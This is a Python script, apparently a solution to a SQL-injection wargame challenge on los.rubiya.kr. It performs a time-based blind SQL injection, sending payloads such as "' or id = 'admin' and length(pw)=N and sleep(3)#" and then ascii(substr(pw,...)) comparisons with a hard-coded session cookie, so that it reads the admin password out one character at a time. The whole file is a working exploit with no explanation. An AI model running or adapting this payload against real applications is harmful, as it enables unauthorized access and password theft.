import requests
import time
import warnings

warnings.filterwarnings("ignore")

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'

# params = {'pw': 'aaa\' union select sleep(3) or \'1\' = \'1'}
flag = False
PwLen = 0

while(not flag):
	PwLen += 1
	params = {'pw': '\' or id = \'admin\' and length(pw)='+str(PwLen)+' and sleep(3)#'}
	cookies = {'PHPSESSID': '2l2irvhg25d0n5uvi3prrbr1t3'}
	firstTime = time.time()
	res = requests.get(url, params=params , cookies=cookies)
	#print(res.status_code)
	#print(res.text)
	Time = time.time() - firstTime
	#print(Time)
	flag = Time > 3.0

print(PwLen)
cursor = 0
Password = ''
for cursor in range(1,PwLen+1):
	pw = 0 # 33~126
	flag = False
	while(not flag):
		if(pw >= 127):
			print('err!!')
			break
		params = {'pw': '\' or id = \'admin\' and ascii(substr(pw,'+str(cursor)+',1))='+str(pw)+' and sleep(3)#'}
		cookies = {'PHPSESSID': '2l2irvhg25d0n5uvi3prrbr1t3'}
		firstTime = time.time()
		res = requests.get(url, params=params , cookies=cookies)
		#print(res.status_code)
		#print(res.text)
		Time = time.time() - firstTime
		#print(Time)
		flag = Time > 3.0
		if(flag):
			Password += chr(pw)
		pw += 1
		print(Password)